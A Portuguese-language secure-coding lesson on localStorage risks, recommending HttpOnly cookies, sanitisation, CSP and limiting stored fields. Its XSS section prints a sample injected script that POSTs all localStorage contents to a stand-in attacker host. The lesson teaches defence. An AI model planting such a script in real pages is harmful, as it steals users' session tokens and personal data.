# FE03-71 — Segurança no LocalStorage

## A regra de ouro

**Nunca armazene dados sensíveis no localStorage.** Tokens de autenticação, senhas, dados bancários, informações pessoais identificáveis — nada disso deve morar ali.

## Por que é inseguro

### Acesso livre via XSS

Qualquer JavaScript que rode na sua página — incluindo scripts maliciosos injetados — tem acesso total ao `localStorage` da origem:

```javascript
// Script injetado via XSS — rouba tudo em uma linha
fetch("https://atacante.com", {
  method: "POST",
  body: JSON.stringify({ ...localStorage })
});
```

Não há isolamento: `localStorage` é um objeto global acessível por qualquer código na origem.

### Acesso físico

Quem tem acesso ao computador pode abrir o DevTools e ler tudo — sem nenhuma proteção:

```text
DevTools → Application → Local Storage → seus dados em texto claro
```

### Sem expiração nem criptografia

Os dados ficam em texto plano no disco, indefinidamente, até serem apagados manualmente.

## O que NÃO armazenar

| Dado | Risco |
| --- | --- |
| JWT / token de sessão | Roubo = acesso total à conta |
| Senha (mesmo hasheada) | Nunca deve sair do backend |
| Número de cartão | Violação de PCI-DSS |
| CPF, RG, dados pessoais | Vazamento de PII — LGPD |
| Chaves de API secretas | Expostas a qualquer script |
| Dados de saúde, financeiros | Regulamentados — nunca no client |

## O que PODE armazenar

| Dado | Por que é seguro |
| --- | --- |
| Tema claro/escuro | Preferência pública, sem valor de ataque |
| Idioma, fonte, layout | Mesma razão |
| Rascunho de formulário | Dado do próprio usuário |
| Carrinho de compras | Itens, sem dados de pagamento |
| Flag "já viu tutorial" | Estado de UX |
| Cache de dados públicos | Conteúdo que já é público |

## A alternativa segura para autenticação

Para tokens de sessão, o padrão correto é **cookie HttpOnly**:

```javascript
// O servidor seta o cookie — JavaScript não pode ler
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| | `localStorage` | Cookie `HttpOnly` |
| --- | --- | --- |
| Acessível via JS | Sim — XSS rouba | Não — inacessível a scripts |
| Enviado ao servidor | Manual (header) | Automático |
| Proteção contra XSS | Nenhuma | Total |
| Proteção contra CSRF | Imune (não é automático) | Precisa de `SameSite` |

## Mitigações se precisar usar mesmo assim

### 1. Sanitize toda entrada (defesa contra XSS)

```javascript
// ❌ innerHTML com dado do usuário = porta para XSS
elemento.innerHTML = inputUsuario;

// ✅ textContent não interpreta HTML
elemento.textContent = inputUsuario;
```

### 2. Content Security Policy (CSP)

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

Bloqueia scripts inline e de origens não autorizadas — reduz drasticamente a superfície de XSS.

### 3. Ofuscação não é segurança

```javascript
// ❌ Base64 não é criptografia — é legível por qualquer um
localStorage.setItem("token", btoa("segredo")); // engana ninguém
```

Se precisar de sigilo real, a solução é não armazenar no client — ou usar criptografia de verdade com chave no servidor (não trivial).

### 4. Limite o escopo do que salva

```javascript
// ❌ Salva o objeto inteiro, incluindo campos sensíveis
storage.set("usuario", usuarioCompleto);

// ✅ Salva só o necessário
const { senha, cpf, ...dadosPublicos } = usuario;
storage.set("usuario", dadosPublicos);
```

## Checklist de segurança

- Pergunte: *"se um atacante ler isso, o que acontece?"* — se a resposta for grave, não armazene
- Tokens de sessão → cookie `HttpOnly` + `Secure` + `SameSite`
- Sanitize **toda** entrada antes de inserir no DOM (`textContent` > `innerHTML`)
- CSP para reduzir superfície de XSS
- Ao deslogar, `localStorage.clear()` ou `removeItem` das chaves sensíveis
- Considere `sessionStorage` para dados que não devem sobreviver ao fechamento

## Resumo executivo

`localStorage` é uma **prateleira pública** — conveniente para dados não sensíveis (preferências, cache, rascunhos), mas jamais para segredos. A regra prática: se vazar não faz mal, pode guardar; se vazar é um incidente, fica no servidor.
